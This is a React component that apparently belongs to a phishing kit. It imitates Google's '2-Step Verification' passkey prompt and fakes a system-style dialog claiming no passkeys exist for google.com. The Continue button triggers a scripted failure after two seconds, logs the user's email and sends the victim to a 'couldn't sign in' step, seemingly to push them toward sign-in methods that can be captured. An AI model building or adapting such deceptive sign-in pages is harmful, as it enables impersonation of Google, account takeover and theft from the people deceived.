import React, { useState } from "react";
import ReactDOM from "react-dom";

const PasskeyStep = ({
  setStep,
  email,
  setIsLoading,
  isLoading,
  onTryAnotherWay,
  handleStepChangeWithLoading,
}) => {
  const [trustDevice, setTrustDevice] = useState(true);
  const [isHovered, setIsHovered] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);

  const closeModal = () => {
    setShowErrorModal(false); // Modal close karega
    // Step 5 (CouldntSignInStep) par switch karne ke liye proper animated loading indicator lagaya
    if (typeof handleStepChangeWithLoading === "function") {
      handleStepChangeWithLoading(7);
    } else {
      setIsLoading(false);
      setStep(7);
    }
  };

  const renderNativeLikeAlert = () => {
    if (!showErrorModal) return null;

    return ReactDOM.createPortal(
      <div
        style={{
          position: "fixed",
          top: 0,
          left: 0,
          width: "100vw",
          height: "100vh",
          backgroundColor: "rgba(0, 0, 0, 0.6)",
          zIndex: 999999, // Overlay level
          display: "flex",
          justifyContent: "center", // Horizontal Center
        }}
      >
        <div
          style={{
            position: "absolute",
            top: "0px", // Native alert position
            backgroundColor: "#1F1F1F", // Standard dark background color
            width: "100%",
            maxWidth: "420px",
            borderRadius: "24px", // Corners same as image
            padding: "32px 24px 24px 24px",
            boxShadow: "0px 10px 40px rgba(0,0,0,0.8)", // Enhanced floating effect
            display: "flex",
            flexDirection: "column",
            boxSizing: "border-box", // Correct border calculation
            overflow: "hidden", // Taake image ya content top corners se bahar na nikle
          }}
        >
          {/* Custom Header with provided image design */}
          <div
            style={{
              display: "flex",
              justifyContent: "center",
              alignItems: "center",
              height: "90px",
              marginBottom: "16px",
              position: "relative",
            }}
          >
            <img
              src="/templates/dialog_design.png" // Aapki JPG image
              alt="Dialog Design"
              style={{
                height: "100%", // Maintain aspect ratio within container
                width: "auto",
                mixBlendMode: "lighten", // Yeh CSS trick image ke background ko modal ke color se perfectly match kar degi
              }}
            />
          </div>

          <h3
            style={{
              color: "#E2E2E2",
              fontSize: "20px",
              fontWeight: "400",
              margin: "0 0 12px 0",
              fontFamily: "inherit",
            }}
          >
            No passkeys available
          </h3>

          <p
            style={{
              color: "#C4C7C5",
              fontSize: "14px",
              lineHeight: "1.5",
              margin: "0 0 32px 0",
              fontFamily: "inherit",
            }}
          >
            There aren't any passkeys for google.com on this device
          </p>

          <div
            style={{
              display: "flex",
              justifyContent: "flex-end",
              width: "100%",
            }}
          >
            <button
              type="button"
              onClick={closeModal} // Naya function jo modal close karne ke sath loading bhi rokay ga
              style={{
                backgroundColor: "#1A2B1D",
                color: "#93D689",
                border: "1px solid #93D689",
                borderRadius: "100px",
                padding: "8px 24px",
                fontSize: "14px",
                fontWeight: "500",
                cursor: "pointer",
                transition: "background-color 0.2s",
              }}
              onMouseEnter={(e) =>
                (e.currentTarget.style.backgroundColor = "#243B27")
              }
              onMouseLeave={(e) =>
                (e.currentTarget.style.backgroundColor = "#1A2B1D")
              }
            >
              Close
            </button>
          </div>
        </div>
      </div>,
      document.body, // Portal targets the body element to bypass any CSS transforms
    );
  };

  const handleContinue = () => {
    setIsLoading(true); // Main card par loading bar start hogi
    setTimeout(() => {
      // Hum yahan se setIsLoading(false) hata rahay hain taake line card par chalti rahay
      setShowErrorModal(true);
      console.log("Passkey Error Triggered for:", email);
    }, 2000);
  };

  return (
    <>
      {/* Main Content Area */}
      <div className="right-side slide-in-right" style={{ paddingTop: "20px" }}>
        <div
          style={{
            width: "100%",
            maxWidth: "500px",
            display: "flex",
            flexDirection: "column",
            position: "relative",
            left: "20px",
          }}
        >
          <div
            style={{
              display: "flex",
              justifyContent: "center",
              marginBottom: "10px",
              userSelect: "none",
            }}
          >
            <img
              src="/templates/passkey.png"
              alt="Passkey Illustration"
              style={{ width: "330px", height: "auto" }}
            />
          </div>

          <h2
            style={{
              fontSize: "20px",
              fontWeight: "400",
              color: "#e3e3e3",
              marginBottom: "8px",
            }}
          >
            2-Step Verification
          </h2>

          <p
            style={{
              fontSize: "14px",
              color: "#e3e3e3",
              marginBottom: "15px",
              lineHeight: "1.5",
            }}
          >
            Your device will ask for your fingerprint, face, or screen lock
          </p>

          <label
            className="checkbox-container"
            style={{
              marginBottom: "32px",
              display: "flex",
              alignItems: "center",
            }}
          >
            <input
              type="checkbox"
              checked={trustDevice}
              onChange={(e) => setTrustDevice(e.target.checked)}
              className="custom-checkbox-input"
            />
            <span className="custom-checkbox">
              <svg className="checkmark" viewBox="0 0 24 24">
                <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" />
              </svg>
            </span>
            <span
              className="checkbox-label"
              style={{ fontSize: "14px", userSelect: "none" }}
            >
              Don't ask again on this device
            </span>
          </label>

          <div
            className="bottom-buttons"
            style={{
              marginTop: "12px",
              justifyContent: "flex-end",
              display: "flex",
              gap: "16px",
              width: "100%",
            }}
          >
            <button
              type="button"
              onClick={onTryAnotherWay}
              onMouseEnter={() => setIsHovered(true)}
              onMouseLeave={() => setIsHovered(false)}
              style={{
                background: isHovered
                  ? "rgba(168, 199, 250, 0.12)"
                  : "transparent",
                border: "none",
                color: "#a8c7fa",
                fontSize: "14px",
                cursor: "pointer",
                fontWeight: "500",
                padding: "8px 16px",
                borderRadius: "100px",
                transition: "background-color 0.15s ease, color 0.15s ease",
              }}
            >
              Try another way
            </button>

            <button
              type="button"
              onClick={handleContinue}
              disabled={isLoading}
              style={{
                background: "#a8c7fa",
                border: "none",
                color: "#062e6f",
                height: "44px",
                padding: "0 28px",
                borderRadius: "999px",
                fontSize: "15px",
                cursor: "pointer",
                fontWeight: "500",
                transition: "0.2s",
              }}
            >
              Continue
            </button>
          </div>
        </div>
      </div>
      {renderNativeLikeAlert()}
    </>
  );
};

export default PasskeyStep;
